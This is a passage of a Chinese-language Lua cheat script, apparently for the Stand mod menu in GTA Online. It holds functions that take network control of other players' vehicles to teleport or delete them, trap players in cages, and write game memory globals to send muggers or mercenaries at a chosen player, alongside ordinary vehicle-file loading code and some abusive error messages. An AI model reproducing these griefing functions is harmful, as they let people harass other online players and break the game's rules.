        tp_all_player_cars_to_coords(c)
    end)
    
    menu.action(apforcedacts_root, "传送载具到深海底", {"tpavunderwater"}, "如果这不起作用，它不是一个bug", function(on_click)
        local c = {}
        c.x = 4497.2207
        c.y = 8028.3086
        c.z = -32.635174
        tp_all_player_cars_to_coords(c)
    end)
    
    menu.action(apforcedacts_root, "传送载具到高空", {"tpahigh"}, "如果这不起作用，它不是一个bug", function(on_click)
        local c = {}
        c.x = -75
        c.y = -818
        c.z = 2400
        tp_all_player_cars_to_coords(c)
    end)
    
    menu.action(apforcedacts_root, "传送载具到洛圣都改车王", {"tpavlsc"}, "如果这不起作用，它不是一个bug", function(on_click)
        local c = {}
        c.x = -353.84512
        c.y = -135.59108
        c.z = 39.009624
        tp_all_player_cars_to_coords(c)
    end)
    
    menu.action(apforcedacts_root, "传送载具到监狱SCP-173单元", {"tpavscp"}, "如果这不起作用，它不是一个bug", function(on_click)
        local c = {}
        c.x = 1642.8401
        c.y = 2570.7695
        c.z = 45.564854
        tp_all_player_cars_to_coords( c)
    end)
    
    menu.action(apforcedacts_root, "传送载具到大牢房中", {"tpavcell"}, "如果这不起作用，它不是一个bug", function(on_click)
        local c = {}
        c.x = 1737.1896
        c.y = 2634.897
        c.z = 45.56497
        tp_all_player_cars_to_coords(c)
    end)
end

--广告机拦截
file_name = filesystem.scripts_dir() .. '\\baibaiScript\\'..'AnTi_Adword.txt'
banned_words = {}

function file_exists(path)
    local file = io.open(path, "rb")
    if file then file:close() end
    return file ~= nil
end

if not file_exists(file_name) then
  util.toast(file_name .. ' was not found, please make sure the script is installed correctly.')
  util.stop_script()
else
    file = io.open(file_name, "r")
    i = 0
    for l in file:lines() do
        i = i + 1
        banned_words[i] = string.lower(l)
    end
    file:close()
end




function GetControl(vic, spec, pid)
    if not players.exists(pid) then
        util.stop_thread()
    end
    if pid == players.user() then
        return
    end    
    local tick = 0
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vic)
    while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vic) do
        local nid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(vic)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(nid, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vic)
        util.yield()
        tick =  tick + 1
        if tick > 20 then
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vic) then
                if set.alert then
                    util.toast('Could not gain control')
                end
                if not spec then
                    Specoff(pid)
                end
                util.stop_thread()
            end
        end
    end
    return NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vic)
end

function Streament(hash) --Streaming Model
    STREAMING.REQUEST_MODEL(hash)
    while STREAMING.HAS_MODEL_LOADED(hash) ==false do
    util.yield()
    end
end

function Delcar(vic, spec, pid)
    if PED.IS_PED_IN_ANY_VEHICLE(vic) ==true then
        local tarcar = PED.GET_VEHICLE_PED_IS_IN(vic, true)
        GetControl(tarcar, spec, pid)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(tarcar)
        entities.delete_by_handle(tarcar)
    end
end

function Pedspawn(pedhash, tar1)
    Streament(pedhash)
    local pedS = entities.create_ped(1, pedhash, tar1, 0)
    ENTITY.SET_ENTITY_INVINCIBLE(pedS, true)
    ENTITY.FREEZE_ENTITY_POSITION(pedS, true)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pedS, true)
    PED.SET_PED_CAN_LOSE_PROPS_ON_DAMAGE(pedS, false)
    if pedhash == util.joaat('ig_lestercrest') then
        PED.SET_PED_PROP_INDEX(pedS, 1)
    end

    return pedS
end

function SetPedCoor(pedS, tarx, tary, tarz)
    ENTITY.SET_ENTITY_COORDS(pedS, tarx, tary, tarz, false, true, true, false)
end

function Teabagtime(p1, p2, p3, p4, p5, p6, p7, p8)
    util.create_tick_handler (function ()
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p1, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p2, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p3, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p4, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p5, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p6, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p7, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p8, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        util.yield(100)
        end)
end



function Jesuslovesyou(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(pi, 'BUMP', 'JESSE', 'SPEECH_PARAMS_FORCE', 1)
            util.yield(250)
        end
    end)
end

function Trevortime(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(pi, 'TR2_ABAJ', 'TREVOR', 'SPEECH_PARAMS_FORCE', 1)
            util.yield(100)
        end
    end)
end

function Fuckyou(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_NATIVE(pi, 'GENERIC_FUCK_YOU', 'SPEECH_PARAMS_FORCE', 1)
            util.yield(100)
        end
    end)
end

function Provoke(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_NATIVE(pi, 'Provoke_Trespass', 'Speech_Params_Force_Shouted_Critical', 1)
            util.yield(100)
        end

    end)
end

function JuggleCar(Vehj_h, tar1,  invisjugc, jugr)
    local  CC = VEHICLE.CREATE_VEHICLE(Vehj_h, tar1.x, tar1.y, tar1.z - 5.0, 0, true, true, false)
    if invisjugc then
     ENTITY.SET_ENTITY_VISIBLE(CC, false, 0)
 end
     ENTITY.SET_ENTITY_INVINCIBLE(CC, true)
     ENTITY.SET_ENTITY_VELOCITY(CC, 0, 0, 1000)
     VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(CC, true)
     VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(CC, true)
     util.yield(jugr)
     ENTITY.SET_ENTITY_AS_MISSION_ENTITY(CC)
     entities.delete_by_handle(CC)
end

function Insulthigh(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_NATIVE(pi, 'Generic_Insult_High', 'SPEECH_PARAMS_FORCE', 1)
            util.yield(100)
        end
    end)
end

function Warcry(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_NATIVE(pi, 'GENERIC_WAR_CRY', 'SPEECH_PARAMS_FORCE', 1)
            util.yield(100)
        end

    end)
end

function Streamanim(anim) --Streaming Model
    STREAMING.REQUEST_ANIM_DICT(anim)
    while STREAMING.HAS_ANIM_DICT_LOADED(anim) ==false do
        STREAMING.REQUEST_ANIM_DICT(anim)
        util.yield()
    end
end

function Runanim(ent, animdict, anim)
    TASK.TASK_PLAY_ANIM(ent, animdict, anim, 1.0, 1.0, -1, 3, 0.5, false, false, false)
    while ENTITY.IS_ENTITY_PLAYING_ANIM(ent, animdict, anim, 3) ==false do
        TASK.TASK_PLAY_ANIM(ent, animdict, anim, 1.0, 1.0, -1, 3, 0.5, false, false, false)
        util.yield()
    end
end

function Streamptfx(lib)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(lib)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(lib) do
        util.yield()
    end
    GRAPHICS.USE_PARTICLE_FX_ASSET(lib)
end

function PFP(pedm, playerm)--Ped Facing Player adapted from PhoenixScript
    local ppos = ENTITY.GET_ENTITY_COORDS(playerm)
    local pmpos = ENTITY.GET_ENTITY_COORDS(pedm)
    local hx = ppos.x - pmpos.x
    local hy = ppos.y - pmpos.y
    local head = MISC.GET_HEADING_FROM_VECTOR_2D(hx, hy)
    return ENTITY.SET_ENTITY_HEADING(pedm, head)
end

function DelEnt(ped_tab)
    for _, Pedm in ipairs(ped_tab) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Pedm)
        entities.delete_by_handle(Pedm)
    end
end

function Stopsound()
    for i = 0, 99 do
        AUDIO.STOP_SOUND(i)
    end
end

function IPM(targets, tar1, pname, cage_table, pid)
    local tar2 = ENTITY.GET_ENTITY_COORDS(targets)
    local disbet = SYSTEM.VDIST2(tar2.x, tar2.y, tar2.z, tar1.x, tar1.y, tar1.z)
    if disbet <= 0.5  then
    if set.alert then
        util.toast(pname..' 已被笼子困住')
    end
    util.yield(800)

    elseif disbet >= 0.5  then
    util.yield(800)
    if set.alert then
        util.toast(pname..' 挣脱了笼子')
    end
    DelEnt(cage_table[pid])
    cage_table[pid] = false
    Stopsound()
    end
end


function CombineTables(table1, table2, table3, table4, table5, table6, table7, table8, table9, table10, table11, result)
	for _, v in ipairs(table1) do
		table.insert(result, v)
	end
	for _, v in ipairs(table2) do
		table.insert(result, v)
	end
    for _, v in ipairs(table3) do
		table.insert(result, v)
	end
	for _, v in ipairs(table4) do
		table.insert(result, v)
	end
    for _, v in ipairs(table5) do
		table.insert(result, v)
	end
	for _, v in ipairs(table6) do
		table.insert(result, v)
	end
    for _, v in ipairs(table7) do
		table.insert(result, v)
	end
	for _, v in ipairs(table8) do
		table.insert(result, v)
	end
    for _, v in ipairs(table9) do
		table.insert(result, v)
	end
	for _, v in ipairs(table10) do
		table.insert(result, v)
	end
    for _, v in ipairs(table11) do
		table.insert(result, v)
	end

end

function ObjFrezSpawn(hsel, tar1)
    local objHash = hsel
  local objfS =  OBJECT.CREATE_OBJECT(objHash, tar1.x, tar1.y, tar1.z, true, true, true)
  ENTITY.FREEZE_ENTITY_POSITION(objfS, true)
  return objfS
end

function SetObjCo(objS, tarx, tary, tarz)
    SEC(objS, tarx, tary, tarz, false, true, true, false)
end

function planedied(pid, index, plane)
    local hash <const> = util.joaat(plane)
    request_model(hash)
    local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = get_random_offset_from_entity(targetPed, 20.0, 20.0)
    pos.z = pos.z + 30.0
    local plane = entities.create_vehicle(hash, pos, 0.0)
    set_entity_face_entity(plane, targetPed, true)
    VEHICLE.SET_VEHICLE_FORWARD_SPEED(plane, 150.0)
    VEHICLE.CONTROL_LANDING_GEAR(plane, 3)
end

function nearcarkill(pid)
    if not is_player_active(pid, false, true) then
        return util.stop_thread()
    end
    local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    for _, vehicle in ipairs(get_vehicles_in_player_range(pid, 70.0)) do
        if TASK.GET_ACTIVE_VEHICLE_MISSION_TYPE(vehicle) ~= 6 then
            local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1, false)
            if ENTITY.DOES_ENTITY_EXIST(driver) and not PED.IS_PED_A_PLAYER(driver) then
                request_control_once(driver)
                PED.SET_PED_MAX_HEALTH(driver, 300)
                ENTITY.SET_ENTITY_HEALTH(driver, 300, 0)
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
                TASK.TASK_VEHICLE_MISSION_PED_TARGET(driver, vehicle, targetPed, 6, 100.0, 0, 0.0, 0.0, true)
            end
        end
    end
end

function creep(pid)
    local hash <const> = util.joaat("s_m_y_clown_01")
		local explosion <const> = Effect.new("scr_rcbarry2", "scr_exp_clown")
		local appears <const> = Effect.new("scr_rcbarry2",  "scr_clown_appears")
		request_model(hash)
		local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(player, false)
		local coord = get_random_offset_from_entity(player, 5.0, 8.0)
		coord.z = coord.z - 1.0
		local ped = entities.create_ped(0, hash, coord, 0.0)

		request_fx_asset(appears.asset)
		GRAPHICS.USE_PARTICLE_FX_ASSET(appears.asset)
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
			appears.name,
			ped,
			0.0, 0.0, -1.0,
			0.0, 0.0, 0.0,
			0.5, false, false, false
		)
		set_entity_face_entity(ped, player, false)
		PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
		TASK.TASK_GO_TO_COORD_ANY_MEANS(ped, pos.x, pos.y, pos.z, 5.0, 0, false, 0, 0.0)
		local dest = pos
		PED.SET_PED_KEEP_TASK(ped, true)
		AUDIO.STOP_PED_SPEAKING(ped, true)
		util.create_tick_handler(function()
			local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
			local targetPos = players.get_position(pid)
			if not ENTITY.DOES_ENTITY_EXIST(ped) or PED.IS_PED_FATALLY_INJURED(ped) then
				return false
			elseif pos:distance(targetPos) > 150 and
			request_control(ped) then
				entities.delete_by_handle(ped)
				return false
			elseif pos:distance(targetPos) < 3.0 and request_control(ped) then
				request_fx_asset(explosion.asset)
				GRAPHICS.USE_PARTICLE_FX_ASSET(explosion.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					explosion.name,
					pos.x, pos.y, pos.z,
					0.0, 0.0, 0.0,
					1.0,
					false, false, false, false
				)
				FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, true, 1.0, false)
				ENTITY.SET_ENTITY_VISIBLE(ped, false, false)
				entities.delete_by_handle(ped)
				return false
			elseif targetPos:distance(dest) > 3.0 and request_control_once(ped) then
				dest = targetPos
				TASK.TASK_GO_TO_COORD_ANY_MEANS(ped, targetPos.x, targetPos.y, targetPos.z, 5.0, 0, false, 0, 0.0)
			end
		end)
    end

function sendmugger_npc(pid)
    if NETWORK.NETWORK_IS_SESSION_STARTED() and is_player_active(pid, true, true) and
    not is_player_in_interior(pid) then

        if not NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
            local bits_addr = memory.script_global(1853348 + (players.user() * 834 + 1) + 140)
            memory.write_int(bits_addr, SetBit(memory.read_int(bits_addr), 0))
            write_global.int(1853348 + (players.user() * 834 + 1) + 141, pid)
        else
            notification123:help("劫匪已经开始活动", HudColour.red)
        end
    end
end

function sendkiller(pid)
    if NETWORK.NETWORK_IS_SESSION_STARTED() and is_player_active(pid, true, true) and
    not is_player_in_interior(pid) then

        if not NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 1, true, 0) then
            local bits_addr = memory.script_global(1853348 + (players.user() * 834 + 1) + 140)
            memory.write_int(bits_addr, SetBit(memory.read_int(bits_addr), 1))
            write_global.int(1853348 + (players.user() * 834 + 1) + 141, pid)
        else
            notification123:help("雇佣兵已经开始活动", HudColour.red)
        end
    end
end

function scripthost()
    inviciamountint = 0
    for pid = 0, 31 do
        if players.exists(pid) and pid ~= players.user() then
            local pped = players.user_ped(pid)
            if pped ~= 0 then
                if players.is_marked_as_modder(pid) then
                    inviciamountint = inviciamountint + 1
                end
            end
        end
local ente
                local ent1e = players.user_ped()
                local ent2e = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
                if PED.IS_PED_IN_ANY_VEHICLE(ent1e,true) then
                    ente = ent2e
                else
                    ente = ent1e
                end
                local speede = ENTITY.GET_ENTITY_SPEED(ente)
                local speedcalce = speede * 3.6
                myspeed1e = math.ceil(speedcalce)
            end
        inviciamountintt = inviciamountint
    directx.draw_text(0.167, 0.816, ""..myspeed1e.." KM/H", ALIGN_TOP_LEFT, 0.42, darkBlue, false)
    directx.draw_text(0.167, 0.838, ""..os.date("%X"), ALIGN_TOP_LEFT, 0.47, darkBlue, false)   
    directx.draw_text(0.167, 0.861, "战局玩家: "..#players.list(), ALIGN_TOP_LEFT, 0.47, darkBlue, false)
    directx.draw_text(0.167, 0.885, "作弊玩家: "..inviciamountintt, ALIGN_TOP_LEFT, 0.47, darkBlue, false)
    if PLAYER.GET_PLAYER_NAME(players.get_host()) == "**Invalid**" then
    directx.draw_text(0.167, 0.91, "战局主机: 没有人", ALIGN_TOP_LEFT, 0.47, darkBlue, false)
    else
    directx.draw_text(0.167, 0.91, "战局主机: "..players.get_name(players.get_host()), ALIGN_TOP_LEFT, 0.47, darkBlue, false)
    end
    if PLAYER.GET_PLAYER_NAME(players.get_script_host()) == "**Invalid**" then
    directx.draw_text(0.167, 0.935, "脚本主机: 没有人", ALIGN_TOP_LEFT, 0.47, darkBlue, false)
    else
    directx.draw_text(0.167, 0.935, "脚本主机: "..players.get_name(players.get_script_host()), ALIGN_TOP_LEFT, 0.47, darkBlue, false)
    end
    local hostxvlie = players.get_host_queue_position(players.user())
    if hostxvlie == 0 then
    directx.draw_text(0.167, 0.96, "你现在是战局主机", ALIGN_TOP_LEFT, 0.47, darkBlue, false)
    else
    directx.draw_text(0.167, 0.96, "你的主机优先度: "..hostxvlie, ALIGN_TOP_LEFT, 0.47, darkBlue, false)
    end
end

-------------------------------------``
-- FILE LIST
-------------------------------------

FileList = {
	dir = "",
	ext = "json",
	open = false,
	reference = 0,
	options = {},
	fileOpts = {},
	onClick = nil
}
FileList.__index = FileList

function FileList.new(parent, name, options, dir, ext, onClick)
	local self = setmetatable({dir = dir, ext = ext, options = options}, FileList)
	self.fileOpts = {}
	self.onClick = onClick

	self.reference = menu.list(parent, name, {}, "", function()
		self.open = true
		self:load()
	end, function()
		self.open = false
		self:clear()
	end)

	return self
end


function FileList:load()
	if not self.dir or not filesystem.exists(self.dir) then
		return
	end

	for _, path in ipairs(filesystem.list_files(self.dir)) do
		local name, ext = string.match(path, '^.+\\(.+)%.(.+)$')
		if not self.ext or self.ext == ext then self:createOpt(name, path) end
	end
end

function FileList:createOpt(fileName, path)
	local list = menu.list(self.reference, fileName, {}, "")

	for i, opt in ipairs(self.options) do
		menu.action(list, opt, {}, "", function() self.onClick(i, fileName, path) end)
	end

	self.fileOpts[#self.fileOpts+1] = list
end


function FileList:clear()
	if #self.fileOpts == 0 then
		return
	end

	for i, ref in ipairs(self.fileOpts) do
		menu.delete(ref); self.fileOpts[i] = nil
	end
end

function FileList:add(file, content)
	assert(self.dir ~= "", "tried to add a file to a null directory")
	if not filesystem.exists(self.dir) then
		filesystem.mkdir(self.dir)
	end

	local name, ext = string.match(file, '^(.+)%.(.+)$')
	local count = 1

	while filesystem.exists(self.dir .. file) do
		count = count + 1
		file = string.format("%s (%s).%s", name, count, ext)
	end

	local file <close> = assert(io.open(self.dir .. file, "w"))
	file:write(content)
end


function FileList:reload()
	self:clear()
	self:load()
end



---生成选项
slaxdom = require("lib.baibai1lib.slaxdom")
slaxml = require("lib.baibai1lib.slaxml")
lunajson = require("lib.baibai1lib.lib.lunajson")
local iniparser = require("lib.baibai1lib.iniparser")
fail_text = "这文件不可以加载，可能是你妈的格式错了.滚去 Discord 上提交一份错误报告，并附上你刚刚尝试加载的载具文件."
instruction_text = "\n按住shift和ctrl，然后点击一个载具，从你的目录中删除这个载具.按住空格，点击一个载具，添加到你的收藏夹."


function request_anim_dict(dict)
    request_time = os.time()
    if not STREAMING.DOES_ANIM_DICT_EXIST(dict) then
        return
    end
    STREAMING.REQUEST_ANIM_DICT(dict)
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end

function request_model_load(hash)
    request_time = os.time()
    if not STREAMING.IS_MODEL_VALID(hash) then
        return
    end
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end


function hasValue( tbl, str )
    local f = false
    for i = 1, #tbl do
        if type( tbl[i] ) == "table" then
            f = hasValue( tbl[i], str )  --  return value from recursion
            if f then break end  --  if it returned true, break out of loop
        elseif tbl[i] == str then
            return true
        end
    end
    return f
end

-- credit to https://stackoverflow.com/questions/1426954/split-string-in-lua
function split_str(inputstr, sep)
    if sep == nil then
            sep = "%s"
    end
    local t={}
    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
            table.insert(t, str)
    end
    return t
end

function to_boolean(text)
    if text == 'true' or text == "1" then
        return true
    end
    return false
end

function get_element_text(el)
    local pieces = {}
    for _,n in ipairs(el.kids) do
      if n.type=='element' then pieces[#pieces+1] = get_element_text(n)
      elseif n.type=='text' then pieces[#pieces+1] = n.value
      end
    end
    return table.concat(pieces)
end


store_dir = filesystem.scripts_dir() .. '\\baibaiScript\\'

vehicles_dir = store_dir .. '\\vehicles\\'
if not filesystem.is_dir(vehicles_dir) then
    filesystem.mkdir(vehicles_dir)
end


maps_dir = store_dir .. '\\maps\\'
if not filesystem.is_dir(maps_dir) then
    filesystem.mkdir(maps_dir)
end



function parse_xml(path)
    -- does this path even exist?
    if not filesystem.exists(path) then
        util.toast("错误XML文件.文件不存在?")
        return
    end
    -- break file into string
    local xml = io.open(path):read('*all')
    -- dom that shit ;)
    local dom = slaxdom:dom(xml, {stripWhitespace=true})
    -- return our dominant superior ;)
    return dom
end

all_vehicles = {}
all_maps = {}

favorite_vehicles = {}
favorite_maps = {}

function search_vehicle(query)
    local finds = {}
    for i, path in ipairs(filesystem.list_files(vehicles_dir)) do
        local v_name = path:gsub(vehicles_dir, '')
        if string.endswith(v_name, '.ini') or string.endswith(v_name, '.xml') or string.endswith(v_name, '.json') then
            if string.contains(string.lower(v_name), query) then
                finds[#finds + 1] = v_name
            end
        end
    end
    return finds
end

function search_map(query)
    local finds = {}
    for i, path in ipairs(filesystem.list_files(maps_dir)) do
        local m_name = path:gsub(maps_dir, '')
        if string.endswith(m_name, '.xml')then
            if string.contains(string.lower(m_name), query) then
                finds[#finds + 1] = m_name
            end
        end
    end
    return finds
end

local v_search_results_action 
local m_search_results_action

function get_file_type(file_path)
    local _, _, ext = string.match(file_path, "(.-)([^\\/]-%.?)[.]([^%.\\/]*)$")
    return ext
end

function load_vehicle(path)
    local ext = get_file_type(path) 
    pluto_switch ext do 
        case "xml": 
            menyoo_load_vehicle(path)
            break 
        case "ini":
            ini_load_vehicle(path:gsub(vehicles_dir, ''))
            break 
        case "json":
            json_load_vehicle(path)
            break 
        pluto_default:
            util.toast("这文件不支持 滚吧.")
    end
end

function load_map(path)
    local ext = get_file_type(path) 
    pluto_switch ext do 
        case "xml": 
            menyoo_load_map(path)
            break
        pluto_default:
            util.toast("This is not a supported file.")
    end
end

function favorite_vehicle(file_name)
    local full_path = vehicles_dir .. '\\' .. file_name
    local half_path = vehicles_dir .. '\\'
    os.rename(full_path, half_path .. '[F] ' .. file_name)
    util.toast(file_name .. " 添加到收藏夹!")
    get_all_vehicles_in_dir()
end

function favorite_map(file_name)
    local full_path = maps_dir .. '\\' .. file_name
    local half_path = maps_dir .. '\\'
    os.rename(full_path, half_path .. '[F] ' .. file_name)
    util.toast(file_name .. " 添加到收藏夹!")
    get_all_maps_in_dir()
end


function menyoo_preprocess_ped(ped, att_data, entity_initial_handles)
    local ped_data = {}
    isped = true
    entity = ped
    menyoo_preprocess_entity(ped, att_data)
    if #entity_initial_handles > 0 then
        entity_initial_handles[att_data['InitialHandle']] = ped
    end
    for a,b in pairs(att_data['PedProperties'].kids) do
        local name = b.name
        local val = get_element_text(b)
        if name == 'PedProps' or name == 'PedComps' or name == 'TaskSequence' then
            ped_data[name] = b 
        else
            ped_data[name] = val
        end
    end
    local task_data = {}
    if att_data['TaskSequence'] ~= nil then
        for a,b in pairs(att_data['TaskSequence'].kids) do
            for c,d in pairs(b.kids) do
                task_data[d.name] = get_element_text(d)
            end
        end
    end
    local props = menyoo_build_properties_table(ped_data['PedProps'].kids)
    for k,v in pairs(props) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        PED.SET_PED_PROP_INDEX(ped, k, tonumber(v[1]), tonumber(v[2]), true)
    end
    local comps = menyoo_build_properties_table(ped_data['PedComps'].kids)
    for k,v in pairs(comps) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        PED.SET_PED_COMPONENT_VARIATION(ped, k, tonumber(v[1]), tonumber(v[2]), tonumber(v[2]))
    end
    PED.SET_PED_CAN_RAGDOLL(ped, to_boolean(ped_data['CanRagdoll']))
    PED.SET_PED_ARMOUR(ped, ped_data['Armour'])
    WEAPON.GIVE_WEAPON_TO_PED(ped, ped_data['CurrentWeapon'], 999, false, true)
    -- skipping over relationship groups, fuck that shit, seriously
    -- anim shit
    if task_data['AnimDict'] ~= nil then
        request_anim_dict(task_data['AnimDict'])
        local duration = tonumber(task_data['Duration'])
        local flag = tonumber(task_data['Flag'])
        local speed = tonumber(task_data['Speed'])
        TASK.TASK_PLAY_ANIM(ped, task_data['AnimDict'], task_data['AnimName'], 8.0, 8.0, duration, flag, speed, false, false, false)
    elseif ped_data['AnimDict'] ~= nil then
        request_anim_dict(ped_data['AnimDict'])
        TASK.TASK_PLAY_ANIM(ped, ped_data['AnimDict'], ped_data['AnimName'], 8.0, 8.0, -1, 1, 1.0, false, false, false)
    end
end

function nil_handler(val, default)
    if val == nil then
        val = default
    end
    return val
end

function menyoo_preprocess_entity(entity, data)
    data['Dynamic'] = nil_handler(data['Dynamic'], true)
    data['FrozenPos'] = nil_handler(data['FrozenPos'], true)
    data['OpacityLevel'] = nil_handler(data['OpacityLevel'], 255)
    data['IsInvincible'] = nil_handler(data['IsInvincible'], false)
    data['IsVisible'] = nil_handler(data['IsVisible'], true)
    data['HasGravity'] = nil_handler(data['HasGravity'], false)
    data['IsBulletProof'] = nil_handler(data['IsBulletProof'], false)
    data['IsFireProof'] = nil_handler(data['IsFireProof'], false)
    data['IsExplosionProof'] = nil_handler(data['IsExplosionProof'], false)
    data['IsMeleeProof'] = nil_handler(data['IsMeleeProof'], false)
    ENTITY.FREEZE_ENTITY_POSITION(entity, to_boolean(data['FrozenPos']))
    ENTITY.SET_ENTITY_ALPHA(entity, tonumber(data['OpacityLevel']), false)
    ENTITY.SET_ENTITY_INVINCIBLE(entity, to_boolean(data['IsInvincible']))
    ENTITY.SET_ENTITY_VISIBLE(entity, to_boolean(data['IsVisible']), 0)
    ENTITY.SET_ENTITY_HAS_GRAVITY(entity, to_boolean(data['HasGravity']))
    ENTITY.SET_ENTITY_PROOFS(entity, to_boolean(data['IsBulletProof']), to_boolean(data['IsFireProof']), to_boolean(data['IsExplosionProof']), false, to_boolean(data['IsMeleeProof']), false, true, false)
end

function menyoo_preprocess_car(vehicle, data)
    local colors = menyoo_build_properties_table(data['Colours'].kids)
    local neons = menyoo_build_properties_table(data['Neons'].kids)
    local doorsopen = menyoo_build_properties_table(data['DoorsOpen'].kids)
    local doorsbroken = menyoo_build_properties_table(data['DoorsBroken'].kids)
    if data['TyresBursted'] ~= nil then
        local tyresbursted = menyoo_build_properties_table(data['TyresBursted'].kids)
        for k,v in pairs(tyresbursted) do
            -- fucking menyoo.. here they go mixing up wheel indexes with strings
            k = k:gsub('_', '')
            local cure_menyoo_aids = {['FrontLeft'] = 0, ['FrontRight'] = 1, [2] = 2, [3] = 3, ['BackLeft'] = 4, ['BackRight'] = 5, [6]=6, [7]=7, [8]=8}
            VEHICLE.SET_VEHICLE_TYRE_BURST(vehicle, cure_menyoo_aids[k], false, 0.0)
        end
    end
    local mods = menyoo_build_properties_table(data['Mods'].kids)
    local mod_extras = menyoo_build_properties_table(data['ModExtras'].kids)
    if mod_extras ~= nil then 
        for k,v in pairs(mod_extras) do
            k = k:gsub('_', '')
            VEHICLE.SET_VEHICLE_EXTRA(vehicle, k, not to_boolean(v))
        end
    end
    
    for k,v in pairs(neons) do
        local comp = {['Left']=0, ['Right']=1, ['Front']=2, ['Back']=3}
        VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, comp[k], to_boolean(v))
    end

    VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, tonumber(data['WheelType']))
    for k,v in pairs(mods) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        VEHICLE.SET_VEHICLE_MOD(vehicle, tonumber(k), tonumber(v[1]), to_boolean(v[2]))
    end


    for k,v in pairs(colors) do
        colors[k] = tonumber(v)
    end

    VEHICLE.SET_VEHICLE_COLOURS(vehicle, colors['Primary'], colors['Secondary'])
    VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, colors['Pearl'], colors['Rim'])
    VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, colors['tyreSmoke_R'], colors['tyreSmoke_G'], colors['tyreSmoke_B'])
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vehicle, colors['LrInterior'])
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_6(vehicle, colors['LrDashboard'])
    local livery = tonumber(data['Livery'])
    if livery == -1 then
        livery = 0
    end
